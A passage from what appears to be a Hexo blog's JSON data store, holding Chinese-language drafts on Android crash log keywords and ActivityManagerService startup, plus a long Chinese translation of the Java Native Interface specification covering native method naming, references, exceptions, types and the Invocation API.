\n\nANR分析\n\n","slug":"日志关键词","published":0,"date":"2025-07-21T06:26:06.926Z","updated":"2025-07-21T06:26:45.640Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmdh1fzf4000082uldmqhgt12","content":"<p>崩溃分析<br>FATAL AndroidRuntime </p>\n<p>ANR分析</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>崩溃分析<br>FATAL AndroidRuntime </p>\n<p>ANR分析</p>\n"},{"_content":"# AMS\n\nActivityManagerService 启动\n\n1. SystemServer 在boot的时候启动\nframeworks/base/services/java/com/android/server/SystemServer.java\n```java\n private void startBootstrapServices() {\n        mActivityManagerService = ActivityManagerService.Lifecycle.startService(mSystemServiceManager, atm);\n        mActivityManagerService = ActivityManagerService.Lifecycle.startService(mSystemServiceManager, atm);\n        mActivityManagerService.setSystemServiceManager(mSystemServiceManager);\n        mActivityManagerService.setInstaller(installer);\n }\n\n```","source":"_drafts/android_framework_AMS.md","raw":"# AMS\n\nActivityManagerService 启动\n\n1. SystemServer 在boot的时候启动\nframeworks/base/services/java/com/android/server/SystemServer.java\n```java\n private void startBootstrapServices() {\n        mActivityManagerService = ActivityManagerService.Lifecycle.startService(mSystemServiceManager, atm);\n        mActivityManagerService = ActivityManagerService.Lifecycle.startService(mSystemServiceManager, atm);\n        mActivityManagerService.setSystemServiceManager(mSystemServiceManager);\n        mActivityManagerService.setInstaller(installer);\n }\n\n```","slug":"android_framework_AMS","published":0,"date":"2025-07-28T07:43:12.624Z","updated":"2025-07-28T11:21:11.343Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmdsk3em00000nuulf2ul99ub","content":"<h1 id=\"AMS\"><a href=\"#AMS\" class=\"headerlink\" title=\"AMS\"></a>AMS</h1><p>ActivityManagerService 启动</p>\n<ol>\n<li>SystemServer 在boot的时候启动<br>frameworks/base/services/java/com/android/server/SystemServer.java<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">startBootstrapServices</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">       mActivityManagerService = ActivityManagerService.Lifecycle.startService(mSystemServiceManager, atm);</span><br><span class=\"line\">       mActivityManagerService = ActivityManagerService.Lifecycle.startService(mSystemServiceManager, atm);</span><br><span class=\"line\">       mActivityManagerService.setSystemServiceManager(mSystemServiceManager);</span><br><span class=\"line\">       mActivityManagerService.setInstaller(installer);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ol>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<h1 id=\"AMS\"><a href=\"#AMS\" class=\"headerlink\" title=\"AMS\"></a>AMS</h1><p>ActivityManagerService 启动</p>\n<ol>\n<li>SystemServer 在boot的时候启动<br>frameworks/base/services/java/com/android/server/SystemServer.java<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">startBootstrapServices</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">       mActivityManagerService = ActivityManagerService.Lifecycle.startService(mSystemServiceManager, atm);</span><br><span class=\"line\">       mActivityManagerService = ActivityManagerService.Lifecycle.startService(mSystemServiceManager, atm);</span><br><span class=\"line\">       mActivityManagerService.setSystemServiceManager(mSystemServiceManager);</span><br><span class=\"line\">       mActivityManagerService.setInstaller(installer);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ol>\n"},{"_content":"## 第一章\n\n### 介绍\n\nJNI是原生程序接口。它允许运行在虚拟机内部的Java代码与使用C,C++或者汇编语言编写的应用程序和库进行交互。\n\nJNI不会对底层Java VM的实现产生任何限制。Java VM制造商能够支持JNI而不对VM的其他部分产生任何影响。程序员可以编写原生应用程序或库的一个版本，并且希望它能够和所有支持JNI的Java VM一起工作。\n\n### JNI预览\n\n通过JNI编程，你能够使用原生方法创建、检查和更新Java对象，调用Java方法，捕获和抛出异常，加载类并且获取类信息，执行运行时类型检查。\n\n你可以使用JNI的Invocation API将任意的原生应用程序嵌入Java VM。这使得程序员很容易为现有的应用程序支持Java而并不需要链接VM源代码。\n\n## 第二章\n\n### JNI接口函数和指针\n\n原生代码通过调用JNI函数来访问Java VM功能。通过接口指针来访问JNI函数。接口指针是指向指针的指针。这个指针指向一个指针数组，其中每个都指向一个接口函数。每个接口函数都位于数组中预定义的偏移位置。\n\n![](./images/designa.gif)\n\nJNI接口指针仅在当前线程中可用。因此，原生方法不能将接口指针从一个线程传递到另一个线程。实现JNI的VM可以在JNI接口指针指向的区域中分配和存储线程本地数据。\n\n原生方法接收JNI接口指针作为参数。当从相同的Java线程中多次调用原生方法时，VM保证对原生方法传递相同的接口指针。然而一个原生方法能够从不同的Java线程中被调用，因此可能接收不同的JNI接口指针。\n\n### 编译、加载和链接原生方法\n\n使用System.loadLibrary方法来加载原生方法。下面的例子中，类初始化方法加载了一个特定平台的原生库，其中定义了原生方法f\n\n``` java\npackage pkg;  \n\nclass Cls { \n\n     native double f(int i, String s); \n\n     static { \n         System.loadLibrary(“pkg_Cls”); \n     } \n\n} \n```\n\nSystem.loadLibrary的参数是程序员任意选择的一个库名。系统遵循一种标准的但特定于平台的方法将库名转换成原生库名。例如Solaris系统将名字pkg_Cls转换为libpkg_Cls.so，而Win32系统将名字pkg_Cls转换为pkg_Cls.dll\n\n程序员可以使用一个库来保存任意数量类所需要的所有本地方法，只要使用相同的类加载器来加载这些类。VM内部为每个类加载器维护一个原生库加载列表。VM制造商应该选择本地库名称，以减少名称冲突的可能性。\n\n如果底层操作系统不支持动态链接，VM必须预链接所有本地方法。在这种情况下，VM完成System.loadLibrary调用而不实际加载库。\n\n程序员也可以调用JNI函数RegisterNatives来注册与类相关联的原生方法。RegisterNatives函数对于静态链接函数特别有用。\n\n### 解析原生方法名\n\n原生方法名由以下组件连接而成：\n\n* Java_前缀\n* 完全的类名\n* 下划线分隔符_\n* 方法名\n* 对于重载的本地方法，在两个下划线__后面加上参数签名\n\nVM检查方法名是否与驻留在原生库中的方法相匹配。VM首先查找短名称，没有参数签名的名称。然后查找长名称，带有参数签名的名称。只有当原生方法被另一个原生方法重载时，程序员才需要使用长名称。然而如果原生方法与非原生方法具有相同的名称，这是没有问题的。非原生方法不会驻留在原生库中。\n\n在下面的例子中，原生方法g不必使用长名称进行链接，因为另一个方法g不是原生方法，因此不在原生库中。\n\n``` java\nclass Cls1 { \n\n  int g(int i); \n\n  native int g(double d); \n\n} \n```\n\n我们采用一个简单的名称修改方案来确保所有的Unicode字符都转换为有效的C函数名。我们使用下划线字段_来替换完全类名中的斜杠/。由于名称和类型描述从不以数字开头，我们可以使用\\_0...\\_9来表示转义字符。\n\n| 转义字符 |                             表示                             |\n| :------: | :----------------------------------------------------------: |\n|  _0XXXX  | Unicode字符XXXX，使用小写字符表示非ASC码Unicode字符，例如_0abcd |\n|    _1    |                            字符_                             |\n|    _2    |                            字符;                             |\n|    _3    |                            字符[                             |\n\n在给定的平台上，本地方法和接口API都遵循标准库调用约定。例如UNIX系统使用C调用约定，Win32系统使用__stdcall\n\n### 本地方法参数\n\nJNI接口指针是本地方法的第一个参数。JNI接口指针的类型是JNIEnv。第二个参数取决于本地方法是静态的还是非静态的。非静态本地方法的第二个参数是对对象的引用，静态本地方法的第二个参数是对Java类的引用。\n\n其余参数对应于普通Java方法参数。本地方法调用通过返回值将结果传递回调用程序。\n\n下面的例子演示了使用C函数去实现原生方法f\n\n``` java\npackage pkg;  \n\nclass Cls { \n\n     native double f(int i, String s); \n\n     ... \n\n} \n```\n\n带有长名称Java_pkg_Cls_f_ILjava_lang_String_2的C函数实现本地方法f\n\n``` c\njdouble Java_pkg_Cls_f__ILjava_lang_String_2 (\n     JNIEnv *env,        /* interface pointer */\n     jobject obj,        /* \"this\" pointer */\n     jint i,             /* argument #1 */\n     jstring s)          /* argument #2 */\n{\n     /* Obtain a C-copy of the Java string */\n     const char *str = (*env)->GetStringUTFChars(env, s, 0);\n\n     /* process the string */\n     ...\n\n     /* Now we are done with str */\n     (*env)->ReleaseStringUTFChars(env, s, str);\n\n     return ...\n}\n```\n\n注意，我们总是使用接口指针env操作Java对象。下面的例子是C++版本:\n\n``` c++\nextern \"C\" /* specify the C calling convention */  \n\njdouble Java_pkg_Cls_f__ILjava_lang_String_2 ( \n\n     JNIEnv *env,        /* interface pointer */ \n\n     jobject obj,        /* \"this\" pointer */ \n\n     jint i,             /* argument #1 */ \n\n     jstring s)          /* argument #2 */ \n\n{ \n\n     const char *str = env->GetStringUTFChars(s, 0); \n\n     ... \n\n     env->ReleaseStringUTFChars(s, str); \n\n     return ... \n\n} \n\n```\n\n在C++中额外的间接层和接口指针参数从源代码中消失了。然而其底层机制和C完全相同。在C++中JNI函数被定义为内联成员函数，可以扩展为C对应函数。\n\n### 引用Java对象\n\n基本类型比如整数、字符等在Java和原生代码之间被复制。另一方面，Java对象是通过引用传递的。VM必须持续跟踪所有被传递到原生代码的对象，以便垃圾回收器不会释放这些对象。反之，原生代码必须有一种方式通知VM它不在需要这些对象。此外，垃圾回收器必须能够移动原生代码引用的对象。\n\n### 全局和本地引用\n\nJNI将原生代码使用的对象引用分为两类：本地引用和全局引用。本地引用在原生方法调用期间有效，并且在原生方法返回后自动释放。全局引用在明确释放之前保持有效。\n\n传递给原生方法的对象作为本地引用。JNI函数返回的所有Java对象都是本地引用。JNI允许程序员通过本地引用创建全局引用。期望Java对象的JNI函数同时接受全局和本地引用。原生方法可以返回对于VM的本地或者全局引用作为其结果。\n\n通常，程序员应该在原生方法返回后依靠VM释放所有本地引用。然而有时程序员应该明确释放本地引用。比如考虑以下情况：\n\n* 原生方法访问大型Java对象，从而创建对Java对象的本地引用。原生方法在返回调用者之前执行额外的计算。对大型Java对象的本地引用将防止对象被垃圾回收，即使该对象在剩余的计算中不再使用。\n* 原生方法会创建大量的本地引用，尽管并不是所有的本地引用都同时使用。由于VM需要一定的空间来持续跟踪本地引用，创建太多本地引用可能导致系统内存溢出。例如，本地方法循环遍历一个大的对象数组，获取元素作为本地引用，并在每次迭代中对一个元素进行操作。在每次迭代之后，程序员不再需要对数组元素的本地引用。\n\nJNI允许程序员在原生方法中的任何一点手动删除本地引用。为了确保程序员能够手动释放本地引用，JNI函数不允许创建额外的本地引用，除了它们作为返回结果的引用。\n\n本地引用仅在创建它们的线程中有效。原生代码不能将本地引用从一个线程传递到另一个线程。\n\n### 实现本地引用\n\n为了实现本地引用，Java VM为控制从Java到原生方法的每次转换创建一个注册表。注册表将不可移动的本地引用映射为Java对象，并防止对象被垃圾回收。所有传递给原生方法的Java对象(包括作为JNI函数调用返回结果的那些对象)都被自动添加到注册表中。注册表在原生方法返回后被删除，它的所有内容被垃圾回收。\n\n有不同的方法来实现注册表，例如使用表、链表或者散列表。虽然引用计数可以用来避免注册表中的重复内容，但是JNI实现并没有义务检测和折叠重复内容。\n\n注意，仅通过扫描原生堆栈不能准确的实现本地引用。原生代码可以将本地引用保存在全局或者堆数据结构中。\n\n### 访问Java对象\n\nJNI为全局和本地引用提供了一组丰富的访问函数。这意味着无论VM内部如何表示Java对象，相同的原生方法实现都可以工作。这是JNI能够被各种VM实现支持的一个重要原因。\n\n通过引用使用访问函数的开销要高于直接访问C数据结构。在大多数情况下，我们相信Java程序员使用原生方法来执行一些重要任务，这些任务掩盖了接口的开销。\n\n### 访问原始数组\n\n对于包含许多基本数据类型的大型Java对象，这种开销是不能接受的。考虑用于执行向量和矩阵计算的原生方法。遍历Java数组并使用函数调用获取每个元素的效率非常低。\n\n一种解决方案引入了固定的概念，以便原生方法可以要求VM固定数组的内容。原生方法然后接收一个指向元素的指针。然而这种方法有两个条件:\n\n* 垃圾回收必须支持固定\n* VM必须在内存中连续存储原始数组。虽然这是大多数原始数组最合理的实现，布尔数组可以通过打包或解包实现。因此依赖于布尔数组精确布局的原生代码是不可移植的。\n\n我们采用折中方案克服了上面的两个问题。\n\n首先我们提供了一组函数在Java数组和原生内存缓冲区之间复制基本数组元素。如果原生方法只需要访问一个大数组中的少量元素则使用这些函数。\n\n其次程序员可以使用另一组函数来获取数组元素的固定版本。请记住这些函数可能需要Java VM执行存储分配和复制。这些函数实际上是否复制数组取决于VM的实现:\n\n* 如果垃圾回收支持固定，并且数组的存储与原生方法所期望的相同则不需要复制。\n* 否则数组将被复制到一个不可移动的内存块(比如C堆中)，并执行必要的格式转换。返回一个副本的指针。\n\n最后接口提供了通知VM原生代码不再需要访问数组元素的函数。当调用这些函数时，系统将解除数组的固定，或者将原始数组与其不可移动的副本进行协调并释放副本。\n\n我们提供的方法更加灵活。垃圾回收算法可以对每个给定数组的复制或者固定做出单独的决定。比如，垃圾回收可以复制小对象，但固定大对象。\n\nJNI实现必须确保在多个线程中运行的原生方法能够同时访问同一个数组。比如，JNI可以为每个固定的数组保留一个内部计数器，这样一个线程就不会解除另一个线程固定的数组。注意，JNI不需要为原生方法的独占访问锁定原始数组。同时从不同的线程更新Java数组会导致不确定的结果。\n\n### 访问属性和方法\n\nJNI允许原生代码访问属性和调用Java对象方法。JNI通过符号名和类型签名来标识方法和属性。两步法从名称和签名中计算出定位属性或方法的成本。比如，调用cls类中的方法f时，原生代码首先获取一个方法ID:\n\n``` c\njmethodID mid =      env->GetMethodID(cls, “f”, “(ILjava/lang/String;)D”); \n```\n\n然后，原生代码可以重复使用方法ID而不需要执行方法查找\n\n``` c\njdouble result = env->CallDoubleMethod(obj, mid, 10, str); \n```\n\n属性或方法ID不会阻止VM卸载从其生成ID的类。类被卸载之后属性或方法ID将不可用。因此，如果打算在一段时间内使用属性或者方法ID，原生代码必须确保:\n\n* 保持对底层类的引用\n* 或者重新计算属性或方法ID\n\nJNI不会对属性和方法ID如何在内部实现施加任何限制。\n\n### 报告编程错误\n\nJNI不检查编程错误，比如传空指针或者非法参数类型。非法参数类型包括使用普通Java对象而不是Java类对象。JNI不检查这些编程错误的原因如下:\n\n* 强制JNI函数检查所有可能的错误条件会降低正常原生方法的性能\n* 在很多情况下，没有足够的运行时类型信息来执行这样的检查\n\n大多数C库函数不能防止编程错误。比如，当printf函数接收到一个无效地址时通常会引发运行时错误，而不是返回错误代码。强制C库函数检查所有可能的错误条件可能导致这样的检查在用户代码中和库中重复进行。\n\n程序员不能向JNI函数传递非法指针或错误类型参数。这样会导致不可预期的后果，包括系统状态损坏或VM崩溃。\n\n### Java异常\n\nJNI允许原生方法引发任意Java异常。原生代码也能处理未处理的Java异常。未处理的Java异常被传递回VM。\n\n### 异常和错误代码\n\n某些JNI函数使用Java异常机制来报告错误条件。在很多情况下，JNI函数通过返回错误代码并且抛出Java异常来报告错误条件。错误代码通常是一个特殊的返回值(比如NULL)，它超出了正常返回值的范围。因此程序员可以:\n\n* 快速检查最后一个JNI调用的返回值，已确定是否发生了错误\n* 调用ExceptionOccurred函数以获取包含更详细描述错误条件的异常对象\n\n在两种情况下，程序员需要检查异常而不能首先检查错误代码:\n\n* 调用Java方法的JNI函数返回Java方法的结果。程序员必须调用ExceptionOccurred来检查Java方法执行期间可能发生的异常\n* 一些JNI数组访问函数不返回错误代码，但可能抛出ArrayIndexOutOfBoundsException或ArrayStoreException异常\n\n在所有其他情况下，非错误返回值保证没有抛出异常。\n\n### 异步异常\n\n在多线程情况下，当前线程之外的其他线程可能抛出异步异常。异步异常不会立即影响当前线程中原生代码的执行，直到:\n\n* 原生代码调用可能引发同步异常的JNI函数\n* 原生代码使用ExceptionOccurred明确的检查同步和异步异常\n\n注意，只有那些可能引发同步异常的JNI函数才会检查异步异常\n\n原生方法应该在必要的地方插入ExceptionOccurred检查(比如在没有其他异常检查的循环中)，以确保当前线程在合理的时间内响应异步异常。\n\n### 异常处理\n\n在原生代码中有两种处理异常的方法:\n\n* 原生方法可以选择立即返回，从而使在初始化原生方法调用的Java代码中抛出异常\n* 原生代码可以通过调用ExceptionClear清除异常，然后执行自己的异常处理代码\n\n在异常出现之后，原生代码必须在调用其他JNI函数之前首先清除异常。当存在待处理的异常时，可以安全调用的JNI函数包括:\n\n``` c\n  ExceptionOccurred()\n  ExceptionDescribe()\n  ExceptionClear()\n  ExceptionCheck()\n  ReleaseStringChars()\n  ReleaseStringUTFChars()\n  ReleaseStringCritical()\n  Release<Type>ArrayElements()\n  ReleasePrimitiveArrayCritical()\n  DeleteLocalRef()\n  DeleteGlobalRef()\n  DeleteWeakGlobalRef()\n  MonitorExit()\n  PushLocalFrame()\n  PopLocalFrame()\n```\n\n## 第三章\n\n### 基本类型\n\n下面的表格描述Java基本类型和对应的依赖于机器的原生类型\n\n| Java类型 | 原生类型 | 描述       |\n| -------- | -------- | ---------- |\n| boolean  | jboolean | 无符号8位  |\n| byte     | jbyte    | 有符号8位  |\n| char     | jchar    | 无符号16位 |\n| short    | jshort   | 有符号16位 |\n| int      | jint     | 有符号32位 |\n| long     | jlong    | 有符号64位 |\n| float    | jfloat   | 32位       |\n| double   | jdouble  | 64位       |\n| void     | void     |            |\n\n为了方便起见提供了以下定义\n\n``` c\n#define JNI_FALSE  0 \n#define JNI_TRUE   1 \n```\n\njsize整数类型用于描述基本的索引和大小\n\n``` c\ntypedef jint jsize; \n```\n\n### 引用类型\n\nJNI包含很多对应于不同Java对象类型的引用类型。\n\n![](./images/types4.gif)\n\n在C中，所有其他JNI引用类型都被定义为与jobject相同。比如:\n\n``` c\ntypedef jobject jclass; \n```\n\n在C++中，JNI引入了一组虚拟类来表示子类型关系。比如:\n\n``` c++\nclass _jobject {}; \nclass _jclass : public _jobject {}; \n... \ntypedef _jobject *jobject; \ntypedef _jclass *jclass; \n```\n\n### 属性和方法ID\n\n方法和属性ID是常规的C指针类型\n\n``` c\nstruct _jfieldID;              /* opaque structure */ \ntypedef struct _jfieldID *jfieldID;   /* field IDs */ \n \nstruct _jmethodID;              /* opaque structure */ \ntypedef struct _jmethodID *jmethodID; /* method IDs */ \n```\n\n### 值类型\n\njvalue联合类型被用作参数数组中的元素类型。\n\n``` c\ntypedef union jvalue { \n    jboolean z; \n    jbyte    b; \n    jchar    c; \n    jshort   s; \n    jint     i; \n    jlong    j; \n    jfloat   f; \n    jdouble  d; \n    jobject  l; \n} jvalue; \n```\n\n### 类型签名\n\nJNI使用Java VM的类型签名表示。\n\n| 类型签名                  | Java类型 |\n| ------------------------- | -------- |\n| Z                         | boolean  |\n| B                         | byte     |\n| C                         | char     |\n| S                         | short    |\n| I                         | int      |\n| J                         | long     |\n| F                         | float    |\n| D                         | double   |\n| L fully-qualified-class ; | 完整类名 |\n| [ type                    | 类型数组 |\n| ( arg-types ) ret-type    | 方法类型 |\n\n比如，Java方法:\n\n``` java\nlong f (int n, String s, int[] arr); \n```\n\n对应下面的类型签名:\n\n``` c\n(ILjava/lang/String;[I)J \n```\n\n### 改进的UTF-8字符串\n\nJNI使用改进的UTF-8字符串来表示各种字符串类型。改进的UTF-8字符串与Java VM使用的字符串相同。对改进的UTF-8字符串进行编码，以便仅包含非空ASC码字符的字符序列只能用每个字符一个字节表示，但是所有Unicode字符都能被表示。\n\n这种格式与标准UTF-8格式之间有两个不同。首先，使用双字节格式而不是单字节格式对空字符进行编码。这意味着改进的UTF-8字符串永远不会引入空值。其次，只使用标准UTF-8的一字节、二字节和三字节格式。Java VM不识别标准UTF-8的四字节格式，它使用自己的两倍三字节格式代替。\n\n## 第四章\n\n本章作为JNI函数的参考部分，提供了所有JNI函数的完整列表。\n\n注意，\"必须\"一词用来描述对JNI程序员的限制。比如，当你看到某个JNI函数必须接收一个非空对象时，你有责任确保没有将空传递给JNI函数。因此，JNI实现不需要在该JNI函数中执行空指针检查。\n\n### 接口函数表\n\n每个函数都可以通过JNIEnv参数以固定的偏移量访问。JNIEnv类型是一个指向存储所有JNI函数指针结构体的指针。定义如下:\n\n``` c\ntypedef const struct JNINativeInterface *JNIEnv; \n```\n\nVM初始化函数表。注意，前三个条目是为了将来与COM兼容而保留的。此外，我们在函数表的开始处保留了许多额外的空条目，以便将来与类相关的JNI操作可以添加在FindClass之后，而不是在表的末尾。\n\n注意，函数表可以在所有JNI接口指针之间共享。\n\n``` c\nconst struct JNINativeInterface ... = {\n\n    NULL,\n    NULL,\n    NULL,\n    NULL,\n    GetVersion,\n\n    DefineClass,\n    FindClass,\n\n    FromReflectedMethod,\n    FromReflectedField,\n    ToReflectedMethod,\n\n    GetSuperclass,\n    IsAssignableFrom,\n\n    ToReflectedField,\n\n    Throw,\n    ThrowNew,\n    ExceptionOccurred,\n    ExceptionDescribe,\n    ExceptionClear,\n    FatalError,\n\n    PushLocalFrame,\n    PopLocalFrame,\n\n    NewGlobalRef,\n    DeleteGlobalRef,\n    DeleteLocalRef,\n    IsSameObject,\n    NewLocalRef,\n    EnsureLocalCapacity,\n\n    AllocObject,\n    NewObject,\n    NewObjectV,\n    NewObjectA,\n\n    GetObjectClass,\n    IsInstanceOf,\n\n    GetMethodID,\n\n    CallObjectMethod,\n    CallObjectMethodV,\n    CallObjectMethodA,\n    CallBooleanMethod,\n    CallBooleanMethodV,\n    CallBooleanMethodA,\n    CallByteMethod,\n    CallByteMethodV,\n    CallByteMethodA,\n    CallCharMethod,\n    CallCharMethodV,\n    CallCharMethodA,\n    CallShortMethod,\n    CallShortMethodV,\n    CallShortMethodA,\n    CallIntMethod,\n    CallIntMethodV,\n    CallIntMethodA,\n    CallLongMethod,\n    CallLongMethodV,\n    CallLongMethodA,\n    CallFloatMethod,\n    CallFloatMethodV,\n    CallFloatMethodA,\n    CallDoubleMethod,\n    CallDoubleMethodV,\n    CallDoubleMethodA,\n    CallVoidMethod,\n    CallVoidMethodV,\n    CallVoidMethodA,\n\n    CallNonvirtualObjectMethod,\n    CallNonvirtualObjectMethodV,\n    CallNonvirtualObjectMethodA,\n    CallNonvirtualBooleanMethod,\n    CallNonvirtualBooleanMethodV,\n    CallNonvirtualBooleanMethodA,\n    CallNonvirtualByteMethod,\n    CallNonvirtualByteMethodV,\n    CallNonvirtualByteMethodA,\n    CallNonvirtualCharMethod,\n    CallNonvirtualCharMethodV,\n    CallNonvirtualCharMethodA,\n    CallNonvirtualShortMethod,\n    CallNonvirtualShortMethodV,\n    CallNonvirtualShortMethodA,\n    CallNonvirtualIntMethod,\n    CallNonvirtualIntMethodV,\n    CallNonvirtualIntMethodA,\n    CallNonvirtualLongMethod,\n    CallNonvirtualLongMethodV,\n    CallNonvirtualLongMethodA,\n    CallNonvirtualFloatMethod,\n    CallNonvirtualFloatMethodV,\n    CallNonvirtualFloatMethodA,\n    CallNonvirtualDoubleMethod,\n    CallNonvirtualDoubleMethodV,\n    CallNonvirtualDoubleMethodA,\n    CallNonvirtualVoidMethod,\n    CallNonvirtualVoidMethodV,\n    CallNonvirtualVoidMethodA,\n\n    GetFieldID,\n\n    GetObjectField,\n    GetBooleanField,\n    GetByteField,\n    GetCharField,\n    GetShortField,\n    GetIntField,\n    GetLongField,\n    GetFloatField,\n    GetDoubleField,\n    SetObjectField,\n    SetBooleanField,\n    SetByteField,\n    SetCharField,\n    SetShortField,\n    SetIntField,\n    SetLongField,\n    SetFloatField,\n    SetDoubleField,\n\n    GetStaticMethodID,\n\n    CallStaticObjectMethod,\n    CallStaticObjectMethodV,\n    CallStaticObjectMethodA,\n    CallStaticBooleanMethod,\n    CallStaticBooleanMethodV,\n    CallStaticBooleanMethodA,\n    CallStaticByteMethod,\n    CallStaticByteMethodV,\n    CallStaticByteMethodA,\n    CallStaticCharMethod,\n    CallStaticCharMethodV,\n    CallStaticCharMethodA,\n    CallStaticShortMethod,\n    CallStaticShortMethodV,\n    CallStaticShortMethodA,\n    CallStaticIntMethod,\n    CallStaticIntMethodV,\n    CallStaticIntMethodA,\n    CallStaticLongMethod,\n    CallStaticLongMethodV,\n    CallStaticLongMethodA,\n    CallStaticFloatMethod,\n    CallStaticFloatMethodV,\n    CallStaticFloatMethodA,\n    CallStaticDoubleMethod,\n    CallStaticDoubleMethodV,\n    CallStaticDoubleMethodA,\n    CallStaticVoidMethod,\n    CallStaticVoidMethodV,\n    CallStaticVoidMethodA,\n\n    GetStaticFieldID,\n\n    GetStaticObjectField,\n    GetStaticBooleanField,\n    GetStaticByteField,\n    GetStaticCharField,\n    GetStaticShortField,\n    GetStaticIntField,\n    GetStaticLongField,\n    GetStaticFloatField,\n    GetStaticDoubleField,\n\n    SetStaticObjectField,\n    SetStaticBooleanField,\n    SetStaticByteField,\n    SetStaticCharField,\n    SetStaticShortField,\n    SetStaticIntField,\n    SetStaticLongField,\n    SetStaticFloatField,\n    SetStaticDoubleField,\n\n    NewString,\n\n    GetStringLength,\n    GetStringChars,\n    ReleaseStringChars,\n\n    NewStringUTF,\n    GetStringUTFLength,\n    GetStringUTFChars,\n    ReleaseStringUTFChars,\n\n    GetArrayLength,\n\n    NewObjectArray,\n    GetObjectArrayElement,\n    SetObjectArrayElement,\n\n    NewBooleanArray,\n    NewByteArray,\n    NewCharArray,\n    NewShortArray,\n    NewIntArray,\n    NewLongArray,\n    NewFloatArray,\n    NewDoubleArray,\n\n    GetBooleanArrayElements,\n    GetByteArrayElements,\n    GetCharArrayElements,\n    GetShortArrayElements,\n    GetIntArrayElements,\n    GetLongArrayElements,\n    GetFloatArrayElements,\n    GetDoubleArrayElements,\n\n    ReleaseBooleanArrayElements,\n    ReleaseByteArrayElements,\n    ReleaseCharArrayElements,\n    ReleaseShortArrayElements,\n    ReleaseIntArrayElements,\n    ReleaseLongArrayElements,\n    ReleaseFloatArrayElements,\n    ReleaseDoubleArrayElements,\n\n    GetBooleanArrayRegion,\n    GetByteArrayRegion,\n    GetCharArrayRegion,\n    GetShortArrayRegion,\n    GetIntArrayRegion,\n    GetLongArrayRegion,\n    GetFloatArrayRegion,\n    GetDoubleArrayRegion,\n    SetBooleanArrayRegion,\n    SetByteArrayRegion,\n    SetCharArrayRegion,\n    SetShortArrayRegion,\n    SetIntArrayRegion,\n    SetLongArrayRegion,\n    SetFloatArrayRegion,\n    SetDoubleArrayRegion,\n\n    RegisterNatives,\n    UnregisterNatives,\n\n    MonitorEnter,\n    MonitorExit,\n\n    GetJavaVM,\n\n    GetStringRegion,\n    GetStringUTFRegion,\n\n    GetPrimitiveArrayCritical,\n    ReleasePrimitiveArrayCritical,\n\n    GetStringCritical,\n    ReleaseStringCritical,\n\n    NewWeakGlobalRef,\n    DeleteWeakGlobalRef,\n\n    ExceptionCheck,\n\n    NewDirectByteBuffer,\n    GetDirectBufferAddress,\n    GetDirectBufferCapacity,\n\n    GetObjectRefType\n  };\n```\n\n## 第五章\n\nInvocation API允许软件开发商将Java VM加载到任意的原生应用程序中。开发商可以在不链接Java VM源代码的情况下交付支持Java的应用程序。\n\n### 介绍\n\n下面的代码示例演示了如何在Invocation API中使用函数。在这个例子中，C++代码创建了一个Java VM并调用名为Main.test的静态方法。\n\n``` c\n    #include <jni.h>       /* where everything is defined */\n    ...\n    JavaVM *jvm;       /* denotes a Java VM */\n    JNIEnv *env;       /* pointer to native method interface */\n    JavaVMInitArgs vm_args; /* JDK/JRE 6 VM initialization arguments */\n    JavaVMOption* options = new JavaVMOption[1];\n    options[0].optionString = \"-Djava.class.path=/usr/lib/java\";\n    vm_args.version = JNI_VERSION_1_6;\n    vm_args.nOptions = 1;\n    vm_args.options = options;\n    vm_args.ignoreUnrecognized = false;\n    /* load and initialize a Java VM, return a JNI interface\n     * pointer in env */\n    JNI_CreateJavaVM(&jvm, (void**)&env, &vm_args);\n    delete options;\n    /* invoke the Main.test method using the JNI */\n    jclass cls = env->FindClass(\"Main\");\n    jmethodID mid = env->GetStaticMethodID(cls, \"test\", \"(I)V\");\n    env->CallStaticVoidMethod(cls, mid, 100);\n    /* We are done. */\n    jvm->DestroyJavaVM();\n```\n\n这个例子使用了API中的三个函数。Invocation API允许原生应用程序使用JNI接口指针访问VM特性。\n\n### 创建VM\n\nJNI_CreateJavaVM函数加载并初始化一个Java VM，并返回一个指向JNI接口指针的指针。调用JNI_CreateJavaVM函数的线程被作为主线程。\n\n### 绑定VM\n\nJNI接口指针JNIEnv仅在当前线程有效。如果另一个线程需要访问Java VM，它必须先调用AttachCurrentThread将自己绑定到VM，并获得JNI接口指针。一旦绑定到VM，原生线程就像运行在原生方法内部的普通Java线程一样工作。原生线程保持与VM绑定，直到调用DetachCurrentThread来解绑自己。\n\n绑定线程应该有足够的堆栈空间来执行一定数量的工作。每个线程的堆栈空间分配特定于操作系统。\n\n### 解绑VM\n\n绑定到VM的原生线程在退出之前必须调用DetachCurrentThread来解绑自己。如果调用堆栈上有Java方法，线程不能解绑自己。\n\n### 卸载VM\n\nJNI_DestroyJavaVM函数卸载一个Java VM。从JDK/JRE1.1开始，只有主线程可以通过调用DestroyJavaVM卸载VM。从JDK/JRE1.2开始限制被取消，任何线程都可以调用DestroyJavaVM卸载VM。\n\nVM等待直到当前线程成为唯一的非守护用户线程才真正卸载。用户线程包括Java线程和绑定的原生线程。存在此限制是因为Java线程或绑定的原生线程可能持有系统资源，比如锁、窗口等。VM不能自动释放这些资源。通过将当前线程限制为卸载VM时唯一运行的线程，程序员将承担释放任意线程占用系统资源的责任。\n\n### 库和版本管理\n\n从JDK/JRE 